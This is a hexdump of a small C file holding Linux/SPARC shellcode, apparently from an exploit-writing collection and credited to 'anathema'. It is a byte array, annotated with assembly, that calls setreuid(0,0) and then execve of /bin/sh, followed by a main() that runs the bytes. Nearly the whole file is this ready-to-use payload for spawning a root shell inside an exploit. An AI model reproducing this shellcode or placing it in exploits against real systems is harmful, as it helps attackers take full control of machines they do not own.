00000000  2f 2a 0d 0a 20 2a 20 20  4c 69 6e 75 78 2f 53 50  |/*.. *  Linux/SP|
00000010  41 52 43 20 5b 73 65 74  72 65 75 69 64 28 30 2c  |ARC [setreuid(0,|
00000020  30 29 3b 20 65 78 65 63  76 65 28 29 20 6f 66 20  |0); execve() of |
00000030  2f 62 69 6e 2f 73 68 5d  20 73 68 65 6c 6c 63 6f  |/bin/sh] shellco|
00000040  64 65 2e 0d 0a 20 2a 2f  20 20 0d 0a 0d 0a 63 68  |de... */  ....ch|
00000050  61 72 20 63 30 64 65 5b  5d 20 3d 20 2f 2a 20 61  |ar c0de[] = /* a|
00000060  6e 61 74 68 65 6d 61 20  3c 20 61 6e 61 74 68 65  |nathema < anathe|
00000070  6d 61 40 68 61 63 6b 2e  63 6f 2e 7a 61 20 3e 20  |ma@hack.co.za > |
00000080  2a 2f 0d 0a 2f 2a 20 73  65 74 72 65 75 69 64 28  |*/../* setreuid(|
00000090  30 2c 30 29 3b 20 2a 2f  0d 0a 22 5c 78 38 32 5c  |0,0); */.."\x82\|
000000a0  78 31 30 5c 78 32 30 5c  78 37 65 22 20 20 20 2f  |x10\x20\x7e"   /|
000000b0  2a 20 6d 6f 76 20 31 32  36 2c 20 25 67 31 20 20  |* mov 126, %g1  |
000000c0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
000000d0  0a 22 5c 78 39 32 5c 78  32 32 5c 78 34 30 5c 78  |."\x92\x22\x40\x|
000000e0  30 39 22 20 20 20 2f 2a  20 73 75 62 20 25 6f 31  |09"   /* sub %o1|
000000f0  2c 20 25 6f 31 2c 20 25  6f 31 20 20 20 20 20 20  |, %o1, %o1      |
00000100  20 20 20 20 2a 2f 0d 0a  22 5c 78 39 30 5c 78 30  |    */.."\x90\x0|
00000110  61 5c 78 34 30 5c 78 30  39 22 20 20 20 2f 2a 20  |a\x40\x09"   /* |
00000120  61 6e 64 20 25 6f 31 2c  20 25 6f 31 2c 20 25 6f  |and %o1, %o1, %o|
00000130  30 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 22  |0          */.."|
00000140  5c 78 39 31 5c 78 64 30  5c 78 32 30 5c 78 31 30  |\x91\xd0\x20\x10|
00000150  22 20 20 20 2f 2a 20 74  61 20 30 78 31 30 20 20  |"   /* ta 0x10  |
00000160  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000170  20 20 2a 2f 0d 0a 0d 0a  2f 2a 20 65 78 65 63 76  |  */..../* execv|
00000180  65 28 29 20 6f 66 20 2f  62 69 6e 2f 73 68 20 2a  |e() of /bin/sh *|
00000190  2f 0d 0a 22 5c 78 32 64  5c 78 30 62 5c 78 64 38  |/.."\x2d\x0b\xd8|
000001a0  5c 78 39 61 22 20 20 20  2f 2a 20 73 65 74 68 69  |\x9a"   /* sethi|
000001b0  20 25 68 69 28 30 78 32  66 36 32 36 38 30 30 29  | %hi(0x2f626800)|
000001c0  2c 20 25 6c 36 20 2a 2f  0d 0a 22 5c 78 61 63 5c  |, %l6 */.."\xac\|
000001d0  78 31 35 5c 78 61 31 5c  78 36 65 22 20 20 20 2f  |x15\xa1\x6e"   /|
000001e0  2a 20 6f 72 20 25 6c 36  2c 20 30 78 31 36 65 2c  |* or %l6, 0x16e,|
000001f0  20 25 6c 36 20 20 20 20  20 20 20 20 20 2a 2f 0d  | %l6         */.|
00000200  0a 22 5c 78 32 66 5c 78  30 62 5c 78 64 63 5c 78  |."\x2f\x0b\xdc\x|
00000210  64 61 22 20 20 20 2f 2a  20 73 65 74 68 69 20 25  |da"   /* sethi %|
00000220  68 69 28 30 78 32 66 37  33 36 38 30 30 29 2c 20  |hi(0x2f736800), |
00000230  25 6c 37 20 2a 2f 0d 0a  22 5c 78 39 30 5c 78 30  |%l7 */.."\x90\x0|
00000240  62 5c 78 38 30 5c 78 30  65 22 20 20 20 2f 2a 20  |b\x80\x0e"   /* |
00000250  61 6e 64 20 25 73 70 2c  20 25 73 70 2c 20 25 6f  |and %sp, %sp, %o|
00000260  30 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 22  |0          */.."|
00000270  5c 78 39 32 5c 78 30 33  5c 78 61 30 5c 78 30 38  |\x92\x03\xa0\x08|
00000280  22 20 20 20 2f 2a 20 61  64 64 20 25 73 70 2c 20  |"   /* add %sp, |
00000290  30 78 30 38 2c 20 25 6f  31 20 20 20 20 20 20 20  |0x08, %o1       |
000002a0  20 20 2a 2f 0d 0a 22 5c  78 39 34 5c 78 32 32 5c  |  */.."\x94\x22\|
000002b0  78 38 30 5c 78 30 61 22  20 20 20 2f 2a 20 73 75  |x80\x0a"   /* su|
000002c0  62 20 25 6f 32 2c 20 25  6f 32 2c 20 25 6f 32 20  |b %o2, %o2, %o2 |
000002d0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 22 5c 78  |         */.."\x|
000002e0  39 63 5c 78 30 33 5c 78  61 30 5c 78 31 30 22 20  |9c\x03\xa0\x10" |
000002f0  20 20 2f 2a 20 61 64 64  20 25 73 70 2c 20 30 78  |  /* add %sp, 0x|
00000300  31 30 2c 20 25 73 70 20  20 20 20 20 20 20 20 20  |10, %sp         |
00000310  2a 2f 0d 0a 22 5c 78 65  63 5c 78 33 62 5c 78 62  |*/.."\xec\x3b\xb|
00000320  66 5c 78 66 30 22 20 20  20 2f 2a 20 73 74 64 20  |f\xf0"   /* std |
00000330  25 6c 36 2c 20 5b 20 25  73 70 20 2b 20 2d 20 31  |%l6, [ %sp + - 1|
00000340  36 20 5d 20 20 20 20 2a  2f 0d 0a 22 5c 78 64 30  |6 ]    */.."\xd0|
00000350  5c 78 32 33 5c 78 62 66  5c 78 66 38 22 20 20 20  |\x23\xbf\xf8"   |
00000360  2f 2a 20 73 74 20 25 6f  30 2c 20 5b 20 25 73 70  |/* st %o0, [ %sp|
00000370  20 2b 20 2d 20 38 20 5d  20 20 20 20 20 20 2a 2f  | + - 8 ]      */|
00000380  0d 0a 22 5c 78 63 30 5c  78 32 33 5c 78 62 66 5c  |.."\xc0\x23\xbf\|
00000390  78 66 63 22 20 20 20 2f  2a 20 63 6c 72 20 5b 20  |xfc"   /* clr [ |
000003a0  25 73 70 20 2b 20 2d 34  20 5d 20 20 20 20 20 20  |%sp + -4 ]      |
000003b0  20 20 20 20 20 2a 2f 0d  0a 22 5c 78 38 32 5c 78  |     */.."\x82\x|
000003c0  31 30 5c 78 32 30 5c 78  33 62 22 20 20 20 2f 2a  |10\x20\x3b"   /*|
000003d0  20 6d 6f 76 20 30 78 33  62 2c 20 25 67 31 20 20  | mov 0x3b, %g1  |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
000003f0  22 5c 78 39 31 5c 78 64  30 5c 78 32 30 5c 78 31  |"\x91\xd0\x20\x1|
00000400  30 22 20 20 20 2f 2a 20  74 61 20 30 78 31 30 20  |0"   /* ta 0x10 |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000420  20 20 20 2a 2f 0d 0a 3b  0d 0a 0d 0a 2f 2a 0d 0a  |   */..;..../*..|
00000430  20 2a 20 20 54 65 73 74  20 6f 75 74 20 74 68 65  | *  Test out the|
00000440  20 73 68 65 6c 6c 63 6f  64 65 2e 0d 0a 20 2a 2f  | shellcode... */|
00000450  20 0d 0a 6d 61 69 6e 20  28 29 0d 0a 7b 0d 0a 20  | ..main ()..{.. |
00000460  20 20 20 76 6f 69 64 20  28 2a 73 63 29 28 29 20  |   void (*sc)() |
00000470  3d 20 28 76 6f 69 64 20  2a 29 63 30 64 65 3b 0d  |= (void *)c0de;.|
00000480  0a 20 20 20 20 73 63 28  29 3b 0d 0a 7d 0d 0a 0d  |.    sc();..}...|
00000490  0a 2f 2a 20 45 4f 46 20  2a 2f                    |./* EOF */|
0000049a
